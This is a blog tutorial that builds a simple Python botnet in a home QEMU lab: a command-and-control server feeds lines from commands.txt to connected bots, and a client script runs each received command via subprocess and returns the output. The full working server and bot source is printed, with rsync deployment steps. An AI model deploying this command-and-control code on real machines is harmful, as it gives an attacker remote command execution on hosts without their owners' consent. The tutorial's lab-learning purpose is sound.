+++
title = "Simple botnet in python"
description = "Make a botnet mockup in python ."
date = 2022-08-19T01:13:50Z
author = "0script"
+++

## What is a botnet .  
A botnet can be simply defined as a set of hosts performing tasks automatically and communicating with each other in a network.In cybersecurity it becomes even more interesting because hackers will often use sophisticated botnet to completely own a network.  

## How it work  
L'attackant vas souvent utiliser un vers informatique pour prendre le controle de pluisieur hotes sur un reseaux . Les hotes compromis seront souvent sous le control d'une seule machine appeler CnC (command et Control Server) , ce server serat en charge de decider des commandes qui vont etres executer par les bots .  

![Tux, the Linux mascot](https://lirp.cdn-website.com/3c4f0eef/dms3rep/multi/opt/Botnet-960w.JPG)


## Implementation  
We are going to use python3 to implement a botnet on our network, setting up this attack requires that you have access to multiple machines on a network.  
Our botnet is based on the client-server architecture with a server at the center to control the bots (Cnc: Control and Server Command)

For my part I have 3 virtual machines under qemu which are in a LAN under the supervision of a virtual router. Any configuration with 3 or more machines on a LAN might do the trick.

### botserver.py  

When implementing the CnC (command and control server) for our botnet, we use the **socketserver.TCPServer()** class to manage multiple connections. Once a bot connects, its IP address is displayed, followed by the result of the runned command.  

First we import the __socketserver__ library from python.
Then we create the BotHandler class which will create a new instance each time a host connects to the tcp server: `tcpserver=socketserver.TCPServer((HOST,PORT),BotHandler)`.  
```python
import socketserver

class BotHandler(socketserver.BaseRequestHandler):

    def handle(self):
        "handle any request received "
        self.data=self.request.recv(1024).strip()
        print("BotName {} with IP {} sent : ".format(self.data,self.client_address[0]))
        print('sending command ...')
        self.cmdlist=[]
        ## continue ................
```  
The handle function waits for an initial packet from the client. This packet should contain the name of the bot.  

As soon as the connection is made, we open the commands.txt file : each line should contain a command.  
```python
        with open('commands.txt') as file:
            self.cmdlist = [line.strip() for line in file if line.strip()]
```  
The commands to execute are added in `self.cmd.list`
We use **strip()** to be sure not to add empty lines.  

After that we loop our list of commands and each command is sent to our bot: `self.request.sendall(i.strip().encode())`.  
We then wait for a response from the bot containing the result of the execution: `self.data=self.request.recv(1024).strip()`  
```python
for i in self.cmdlist:
            print('RUN {} :'.format(i))
            self.request.sendall(i.strip().encode())
            self.data=self.request.recv(1024).strip()
            print('\toutput : {}'.format(self.data))    
        self.request.sendall('end'.encode())
        pass
```
Once the scrolling of the loop is finished, we send an __'end'__ message to end with the bot: `self.request.sendall('end'.encode())` .  

Inside the main we just create a TCP server: `tcpserver=socketserver.TCPServer((HOST,PORT),BotHandler)`  
Then we put the server in listening mode: `tcp server.serve_forever()` .  
```python
if __name__=='__main__':
    HOST,PORT='',8000
    tcpserver=socketserver.TCPServer((HOST,PORT),BotHandler)
    try:
        print('Bot server is listening...')
        tcpserver.serve_forever()
    except Exception as e:
        print('Oups ! : An error occured .')
        print(e)
```  

This is how the botserver.py file should look like the source code is available on [github](https://github.com/0script/simple-botnet) :   
```python
import socketserver

class BotHandler(socketserver.BaseRequestHandler):

    def handle(self):

        "handle any request received "
        self.data=self.request.recv(1024).strip()
        print("BotName {} with IP {} sent : ".format(self.data,self.client_address[0]))
        print('sending command ...')
        self.cmdlist=[]

        with open('commands.txt') as file:
            self.cmdlist = [line.strip() for line in file if line.strip()]
            
        for i in self.cmdlist:
            print('RUN {} :'.format(i))
            self.request.sendall(i.strip().encode())
            self.data=self.request.recv(1024).strip()
            print('\toutput : {}'.format(self.data))    
        self.request.sendall('end'.encode())

        pass

if __name__=='__main__':

    HOST,PORT='',8000
    tcpserver=socketserver.TCPServer((HOST,PORT),BotHandler)

    try:
        print('Bot server is listening...')
        tcpserver.serve_forever()
    except Exception as e:
        print('Oups ! : An error occured .')
        print(e)
```
It's time to move on to implementing our client bot.

### botclient.py

For our client, we import the **socket** and **subprocess** libs  
```python
import socket
import subprocess
```  

The `botclient()` function creates a tcp socket and connects to the server:
```python
def botclient():
    HOST = '192.168.100.152'#replace with the proper ip 
    PORT = 8000

    s = socket.socket()
    s.connect((HOST, PORT))

    message = 'Connection from '+socket.gethostname()
    s.send(message.encode())
    data = s.recv(1024).decode()
```  

As long as the received packet does not come with an __'end'__ message, we execute the contents of the received packet: `message = subprocess.run(data.split(' '), stdout=subprocess.PIPE)` .
'subprocess.run(['cmd','args'],stdout)' the function take a list as argument .  
```python
while data != 'end':
        if (data):
            try:
                message = subprocess.run(data.split(' '), stdout=subprocess.PIPE)
                s.send(message.stdout)
            except Exception as e:
                print('Error processing'.format(data))
                print(e)
        data = s.recv(1024).decode()
    s.close()
```  

**message** contains the output for the command and is sent back to the server, after execution of the command we wait for another packet.  
The complete file available on [github](https://github.com/0script/simple-botnet) should look like the one below:  
```python
import socket
import subprocess

def botclient():
    HOST = '192.168.100.152'
    PORT = 8000

    s = socket.socket()
    s.connect((HOST, PORT))

    message = 'Connection from '+socket.gethostname()
    s.send(message.encode())
    data = s.recv(1024).decode()
    
    while data != 'end':
        if (data):
            try:
                message = subprocess.run(data.split(' '), stdout=subprocess.PIPE)
                s.send(message.stdout)
            except Exception as e:
                print('Error processing'.format(data))
                print(e)
        data = s.recv(1024).decode()
    s.close()

if __name__ == '__main__':
    botclient()
```
Now it's time to execute :  
  
### execution 
To start I copy bootserver.py and commands.txt in my kali machine and then I copy the client file in my machines which will serve as bot:  
```shell
$echo "ls -a\npwd\nwho\nuname -a\n" > commands.txt
$rsync commands.txt kali@192.168.100.152:/home/kali/hacks/simple-botnet
$rsync botserver.py kali@192.168.100.152:/home/kali/hacks/simple-botnet
$rsync botclient.py oraclevm@192.168.100.186:/home/oraclevm/oracleuser/simple-botnet/botclient.py
$rsync botclient.py ubuntu22@192.168.100.217:/home/ubuntu22/Desktop/ubuntu22
```  
I can now launch the server in my kali machine  
```
$python3 botserver.py
```  

Then I run botclient.py with sleep, time for me to quickly switch tabs so that the bots connect in the same time interval.  
    ![running botclient in oraclelinux](https://preview.redd.it/rteuizlg6ti91.png?width=1024&format=png&auto=webp&s=31581961c1da8416b5c1388ba5fb141be8e96e93 "botnet on oraclevm")  
    ![running botclient in ubuntu](https://preview.redd.it/t6pkoylg6ti91.png?width=739&format=png&auto=webp&s=ce4dfb1d8bb0bacde9a6435e7f8b4093a7ce2e78 "ubuntu22")  

output on the kali machine : CnC server  
    ![](https://photos.google.com/u/0/album/AF1QipNo0tehJ25EAy3xFGUPTP9pV7FsgDJb6dASpWgu/photo/AF1QipM_Pbd1uJKUzw9Yk39L4Uex8rQc9NIqys7owgJv "kali machine running the server")
    ![kali machine CnC server](https://i.redd.it/8edhl0qbsqi91.png "kali")  
## Conclusion  
Although this is a serious security thread, a botnet may not be very easy to implement, it is important for anyone involved in the development and maintenance of an information system to understand their working to identify and secure ways an attacker could use to implement a malicious botnet on their system .    